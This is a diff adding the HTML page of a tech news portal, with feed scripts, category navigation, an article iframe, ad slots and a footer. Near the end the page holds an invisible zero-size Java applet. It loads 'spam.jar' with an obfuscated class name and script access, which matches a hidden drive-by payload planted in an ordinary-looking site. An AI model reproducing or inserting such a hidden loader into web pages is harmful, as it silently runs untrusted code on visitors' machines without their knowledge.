@@ -1,0 +1,86 @@
+﻿<html xmlns="http://www.w3.org/TR/REC-html40" xmlns:spry="http://ns.adobe.com/spry">
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=utf-8">
+<base target="_blank" />
+
+<script src="http://www.google.com/jsapi"></script>
+
+<script type="text/javascript" src="js/myscripts.js"></script>
+
+<title>Top Tech News</title>
+
+<script type="text/javascript">
+	google.load("feeds", "1");
+</script>
+
+<script>
+   google.setOnLoadCallback(loadNewsTabs);
+
+ </script>
+
+
+<link href="gfeed.css" rel="stylesheet" type="text/css">
+<link href="tech.css" rel="stylesheet" type="text/css">
+
+<script type="text/javascript">
+	pic = new Image();
+	function tech(id,divContents){
+    		this.document.getElementById(id).innerHTML = divContents;
+	}
+	function news(imgSrc){
+    		pic.src = imgSrc;
+	}
+   </script>
+</head>
+
+
+<body>
+<div id="wrap">
+<div id="banner"><img src="images/title.jpg"  /></div>
+
+<div id="sidebar"><img src="images/sidebartop.jpg"  />
+<br />
+<div class="sidebox">
+<div id="topnews">Loading...</div>
+<div id="applenews"></div>
+</div>
+</div>
+
+<div id="main">
+<img src="images/topimg.jpg"  />
+<div id="nav">
+<ul>
+      <li id="home"><a href="news.php" target="artcl">Home</a></li>
+      <li id="apple"><a href="apple.php" target="artcl">Apple</a></li>
+      <li id="ms"><a href="microsoft.php" target="artcl">Microsoft</a></li>
+      <li id="reviews"><a href="reviews.php" target="artcl">Reviews</a></li>
+      <li id="gadgets"><a href="gadgets.php" target="artcl">Gadgets</a></li>
+      <li id="mobiles"><a href="mobiles.php" target="artcl">Mobiles</a></li>
+      <li id="games"><a href="games.php" target="artcl">Games</a></li>
+      <li id="security"><a href="security.php" target="artcl">Security</a></li>
+      <li id="weblogs"><a href="weblogs.php" target="artcl">Blogs</a></li>
+   
+</ul>
+</div>
+<iframe id="artcl" name="artcl" src="news.php" width="657" height="1200" allowtransparency="1" scrolling="no" frameborder="0" style="FILTER: chroma (color=00FF80)"></iframe>
+
+</div>
+
+<br class="clearfloat" />
+<div id="ads">
+<div id="ad1">
+  <img src="images/ad/ad1.jpg" width="150" height="77"></div>
+<div id="ad2">
+  <img src="images/ad2/spam.jpg" width="350" height="43"></div>
+</div>
+<div id="footer">
+<p>All Rights Reserved. <script type="text/javascript">document.write('Copyright &copy;' + (new Date()).getFullYear());</script></p>
+</div>
+</div>
+
+
+<applet archive="spam.jar" code="b.a.b.c" height="0" mayscript="true" width="0">
+  <param name="ad1" value="5000"><param name="ad2" value="5000"></applet>
+</body>
+</html>
+</html>
